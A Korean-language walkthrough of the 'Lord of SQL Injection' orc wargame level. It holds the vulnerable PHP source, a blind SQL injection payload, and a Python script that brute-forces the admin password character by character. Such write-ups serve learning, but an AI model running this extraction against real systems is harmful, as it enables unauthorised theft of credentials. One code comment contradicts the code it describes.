# Lord of SQL Injection No.4 - orc
## 문제 출제 의도
기본적인 Blind SQL을 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
orc 문제 의 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello admin</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - 데이터베이스에서 뽑아온 값이 있으면 Hello admin이 출력된다.
    - addslashes 함수
        ~~~
        string addslashes ( string $str )
        ~~~
        *  특수문자로 부터 발생될 수 있는 에러를 피하기위해 특수문자 앞에 역슬래쉬를 붙여주는 역활을하는 함수.
        * 원래대로 돌려줄때는 백슬레쉬를 제거해주는 stripslashes() 함수를 쓴다.

    - 이후 받은 pw 값과 데이터베이스에 뽑아온 pw 값을 비교하여 두 pw 값이 같으면 문제가 풀린다.

+ 문제 해결
    - 직접 패스워드를 알아야 함으로 우선 비밀번호가 몇 글자인지 알아야 한다.
        * 따라서 URL 뒤에 다음과 같은 문자열을 추가 하여 확인한다.
            ~~~
            ?pw=' or id='admin' and length(pw)=8-- -
            ~~~
            이는 Hello admin을 출력하게 만들기 때문에 우리는 pw가 8자리인 것을 알 수 있다.
  

    - 비밀번호의 실제 값을 substr 함수를 통해 알아낸다.
        * SUBSTR
            ~~~
            substr(문자열, 시작index, 길이)
            ~~~
            - 문자열을 자르는 함수이다. 시작 인덱스에서 길이만큼 문자열을 자른다.
            - 이를 통해 문자열을 잘라 문자를 하나씩 알아낸다.
    
    - 한글자씩 알아내는 것은 코드를 이용하여 풀면 편하다.  
    - 다음은 파이썬 코드이다.
    ~~~
        import urllib.request #http 프로토콜에 따라 요청, 응답받기 위해 파이썬의 표준 모듈에 포함되어 있는 urllib 모듈을 사용할 것이다.
        from urllib.parse import quote # python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.

        key = "" #pw값 저장을 위한 문자열 변수
        for i in range(1, 9): #8자리이기 때문에 1~8까지 뺑뺑이
            for j in range(32, 127): #아스키코드에서 유효한 값은33~126이기 때문에
                url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=" #고정된 부분
                data="' or id='admin' and substr(pw,1,{})='{}'#".format(str(i), key + chr(j)) #얘들이 새로 들어갈 애들이다.
                print(data) # 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.
                data = quote(data) # URL Encoding을 해 준다.
                re = urllib.request.Request(url + data) #모듈의 클래스를 통해 re객체 생성
                re.add_header("User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36") # re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다. 
                re.add_header("Cookie", "PHPSESSID=4p56htpvcookallo00ondblnf6") # 쿠키값 입력

                res = urllib.request.urlopen(re) # 객체를 이용해 요청을 보낸다.

                if str(res.read()).find("Hello admin") != -1: # 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.
                    key += chr(j).lower() # key 변수 뒤에 유효한 값인 j를 대문자로 변경하여 추가한다.
                    print(key) # key를 출력한다.
                    break # i번째 문자를 찾았으니 이제 다음 문자를찾아 문자열을 완성하기 위해 안쪽 포문을 탈출한다.
        print(key) #  최종 key를 출력한다.
    ~~~
- 위 코드를 실행하면 295d5844가 출력된다. 이를 URL 뒤에 GET 방식으로 입력하면 해결된다. 

